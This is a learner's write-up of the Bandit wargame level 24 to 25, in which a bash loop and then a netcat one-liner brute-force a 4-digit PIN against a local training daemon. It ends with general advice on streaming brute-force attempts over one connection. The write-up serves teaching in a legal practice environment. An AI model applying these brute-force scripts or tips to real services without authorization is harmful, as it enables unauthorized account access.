# Bandit Level 24 - Level 25

There is a daemon listening on PORT 30002. It accepts the password for Level 24
and a unique 4-digit PIN code. The pin is a number between 0-10000. Which means you're able
to brute force this by generating every possible PIN number. 

I initially started with a script like this: 

```bash
#!/bin/bash

PASSWORD="PASSWORD_FOR_24"
for PIN in $(seq -w 0 9999); do
    echo "trying $PIN"
    RESPONSE=$(echo "$PASSWORD $PIN" | nc localhost 30002)
    if [[ $RESPONSE == *"bandit25"* ]]; then
        echo "FOUND! $RESPONSE"
        break
    fi
done
```

Which didn't actually work. The problem was, that it didn't iterate over to the
next PIN number and instead got stuck on: 

"trying 0000" 

Then I found out that the daemon actually reads everything line by line on a single connection. 

( Apparently most daemons do )

So I could effectively stream all of the attempts at once and it would have no choice
but to look at each line and try the "PASSWORD PIN" combination for every one. 

Something like this one-liner followed: 

```bash
for i in {0000..9999}; do echo "PASSWORD_FOR_24 $i"; done | nc localhost 30002
```

This resulted in a wall of text and finally the output: 

"
Correct!
The password of user bandit25 is PASSWORD_FOR_25
"

Which meant the level was solved. A handy introduction into brute-force. Luckily I had 
experience with programming and I'm very familiar with for-loops. Otherwise I think this
would have been a tricky solve.

# Key lesson 

Many of the daemon networks are line-buffered and expect persisten connections. When brute-forcing
you should avoid opening a new conneciton when the server is stateful. And streaming input through
one connection is actually faster than disconnecting/reconnecting each time. 
